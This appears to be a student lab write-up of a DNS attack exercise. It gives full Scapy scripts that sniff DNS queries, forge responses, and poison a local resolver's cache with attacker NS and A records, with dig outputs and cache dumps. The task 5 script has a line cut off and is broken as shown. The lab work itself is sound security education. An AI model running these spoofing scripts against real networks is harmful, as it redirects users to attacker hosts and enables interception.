# Local DNS Attack Lab

## 2.4 Testing the DNS Setup

```
$ dig ns.attacker32.com
```
![Screenshot 2025-05-17 124530](https://github.com/user-attachments/assets/9908283a-6417-4be0-a1af-c29fd41451be)

We can see that the answer comes from the attacker nameserver because the dig command only returns the attacker namerserver IP adress.

---

```
$ dig www.example.com
```
![image](https://github.com/user-attachments/assets/12389a65-8795-4317-b38a-425e35e15478)

When trying to access ``` www.example.com ``` the DNS nameserver used is not the malicious one.

---

```
$ dig @ns.attacker32.com www.example.com
```
![image](https://github.com/user-attachments/assets/95c05e42-6cfc-442d-a154-0d809fa0dacf)

If we explicitly ask the attacker nameserver, we get a different (and false) IP adress for ```www.example.com```


#### Our goal: Get the user to ask the malicious nameserver first.  
---

## 3.1: Task 1 Directly Spoofing Response to User

This is the script we used to spoof the DNS packet.
``` python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
        if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
                print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IPs

                udp = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination ports

                # The Answer Section
                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.9.0.1')

                # The Authority Section is not needed
                # The Additional Section is not needed

                # Create DNS object
                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)

                spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                send(spoofpkt)

myFilter = "udp and dst port 53" # only capture UDP traffic with destination port 53
pkt=sniff(iface='br-4a379a2ae130', filter=myFilter, prn=spoof_dns)
```

With this code, we sniff for DNS requests containing ``` example.com ```, we spoof a reply by swapping target and source IP addresses and ports and creating a DNS answer section containing the 'bad' IP address we want the victim to use for the respective hostname.

When we now execute ``` dig www.example.com ``` on the ``` user ``` machine, we see this:

![image](https://github.com/user-attachments/assets/393f7f25-df2c-4788-9a2b-f2476ae5434f)

The answer now contains the attacker machine's IP address (```10.9.0.1```) and not the real address like before.

---

## 3.2: Task 2: DNS Cache Poisoning Attack - Spoofing Answers

We now want to be the 'man in the middle' between the local DNS server and a remote authoritative DNS server. 

To do this, we only have to change the filter in our spoofing script to only sniff packets that are coming from our local DNS server and are going to port 53 (DNS requests).

```python
myFilter = "udp and dst port 53 and src host 10.9.0.53" 
```
The rest of the script of task 1 stays the same.

So now the dig request on the ```user``` machine gives 
```
;; ANSWER SECTION:
www.example.com.        259200  IN      A       10.9.0.1
```
as well.

But now the local DNS server cache is also poisoned and contains:

```
www.example.com.        863957  A       10.9.0.1
```

---

## 3.3: Task 3: Spoofing NS Records

Now we want to add an Authority Section to out spoofed DNS reply. This will lead to the local DNS server saving our malicious name server in its cache as the authority responsible for the entire ``` example.com ``` domain. Therefore, when a user makes a DNS request to the local DNS server about any subdomain like ``` mail.example.com ```, the request will be forwarded to the attacker nameserver.

To achieve this, we just create the section in our script with this line:

```python
NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
```

To include it in our spoofed DNS packet, we have to modify the ```nscount``` and ```ns``` properties in the instantiation of our DNS object:

```python
dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, an=Anssec, ns=NSsec1)
```

The rest of the script remains as before.

So if we now execute ```dig mail.example.com``` on the ```user**``` machine, we see the wrong IP address provided by the malicious nameserver:

![image](https://github.com/user-attachments/assets/0b0e097d-f17f-4050-b4c0-895b67fe4eb4)

Further, the local DNS server cache now contains the entry:

```
example.com.            777584  NS      ns.attacker32.com.
```

This means every request made to the DNS server for this domain is forwarded to our attacker nameserver if there is no entry for the specific hostname already in the cache.

---

## 3.4: Task 4: Spoofing NS Records for Another Domain

Now we want our spoofed reply to also add a cache entry for the ```google.com``` domain. To do this, we just add another element to the authority section.

The creation of the additional element in the authority section works in the same way as before:

```python
 NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
```

Of course, we have to inlude this in the DNS object as well:

```python
dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=0, an=Anssec, ns=NSsec1/NSsec2)
```

However, when we now execute ```dig www.example.com``` and then check the local DNS server's cache we will again only find the entry for the ```example.com``` domain and not for ```google.com```. This is because (properly configured) DNS servers only accept Authority Records that match the domain that was originally requested. This was done to prevent exactly this type of attack, the so called 'Cross-Domain-Poisoning'.

---

## 3.5: Task 5: Spoofing Records in the Additional Section

The full script we used for this attack look like this:

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
        if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
                print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

                ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IPs

                udp = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination ports

                # The Answer Section
                Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.9.0.1')

                # The Authority Section
                NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
                NSsec2 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.example.com')

                #The Additional Section
                Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
                Addsec2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='5.6.7.8')
                Addsec3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')

                # Create DNS object
                dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=3, a>
                spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
                send(spoofpkt)

myFilter = "udp and dst port 53 and src host 10.9.0.53"
pkt=sniff(iface='br-4a379a2ae130', filter=myFilter, prn=spoof_dns)
```

- We still include the answer section
- The authority section contains two ```NS``` entries for the ```example.com``` domain.
- The additional section contains three entries: ```ns.attacker.com```, ```ns.example.net``` and ```www.facebook.com```.

After this attack, the local DNS server's cache contains

```
example.com.            777592  NS      ns.example.com.
                        777592  NS      ns.attacker32.com.
```

But none of the entries of the Additional Section are included. Apparently only the two entries of the Authority Section were cached by the local DNS server. We had expected that at least the entry for ```ns.attacker32.com``` would be cached, as there is an Authority Entry for it in the same packet. 

The other two entries were expected to be discarded, as the ```www.facebook.com``` domain is not included in the Authority Section at all and the ```ns.example.net``` is on a different top-level domain (```.net```) than the one in the Authority section.
